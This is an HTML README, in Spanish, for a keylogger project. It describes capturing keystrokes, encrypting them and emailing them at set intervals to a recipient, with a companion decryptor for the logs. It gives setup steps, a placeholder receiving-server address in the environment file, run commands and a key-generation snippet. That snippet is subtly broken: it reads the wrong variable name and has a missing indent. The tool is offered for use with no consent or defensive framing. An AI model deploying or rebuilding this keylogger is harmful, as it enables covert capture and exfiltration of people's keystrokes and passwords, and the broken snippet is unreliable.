  <h1>Keylogger y Decryptor</h1>

  <p>Este proyecto incluye un keylogger que captura teclas, cifra los datos y los envía por correo electrónico, así
      como un script para descifrar los archivos generados.</p>

  <h2>Requisitos</h2>

  <ul>
      <li>Python 3.10.11</li>
      <li>Bibliotecas: <code>cryptography</code>, <code>pynput</code>, <code>python-dotenv</code></li>
  </ul>

  <p>Puedes instalar las bibliotecas necesarias usando el comando pip install -r .\requirements.txt</p>

  <pre><code>pip install cryptography pynput python-dotenv</code></pre>

  <h2>Configuración</h2>

  <h3>Variables de Entorno</h3>

  <p>Crea un archivo <code>.env</code> en el directorio del proyecto con las siguientes variables:</p>

<pre>
  <code>
    pf=ruta/al/archivo/secret.key
    sv="http://tu-ip-receptora/"
  </code>
</pre>

<h3>Generar Clave de Cifrado</h3>

<p>Ejecuta el siguiente script para generar una clave de cifrado y guardarla en un archivo:</p>

<pre>
  <code>
    import os
    from cryptography.fernet import Fernet
    from dotenv import load_dotenv

    load_dotenv()

    # Generar y guardar una clave
    key = Fernet.generate_key()
    with open(os.environ.get("passfile"), 'wb') as key_file:
    key_file.write(key)

    print("Clave de cifrado generada y guardada exitosamente.")
  </code>
</pre>

  <h2>Uso</h2>

  <h3>Keylogger</h3>

  <p>Para ejecutar el keylogger, usa el siguiente comando:</p>

  <pre><code>python app.py --interval &lt;intervalo_en_segundos&gt; --recipient &lt;correo_destinatario&gt;</code></pre>

  <p>Ejemplo:</p>

  <pre><code>python app.py --interval 60 --recipient destinatario@ejemplo.com</code></pre>

  <p>Esto configurará el keylogger para enviar los correos cada 60 segundos a la dirección de correo especificada.</p>

  <h3>Decryptor</h3>

  <p>Para descifrar un archivo de texto cifrado, usa el siguiente comando:</p>

  <pre><code>python decryptor.py &lt;ruta_al_archivo.txt&gt;</code></pre>

  <p>Ejemplo:</p>

  <pre><code>python decryptor.py log.txt</code></pre>

  <p>Esto permitirá descifrar el contenido del archivo <code>log.txt</code>.</p>

  <h2>Notas</h2>

  <ul>
      <li>Asegúrate de que las variables de entorno están correctamente configuradas antes de ejecutar los scripts.
      </li>
      <li>Los archivos generados por el keylogger serán enviados como adjuntos cifrados y el Decryptor puede usarse
          para descifrarlos.</li>
      <li>Los archivos <code>.key</code> deben ser añadidos a tu <code>.gitignore</code> para evitar que sean subidos
          al repositorio.</li>
  </ul>

</body>

</html>

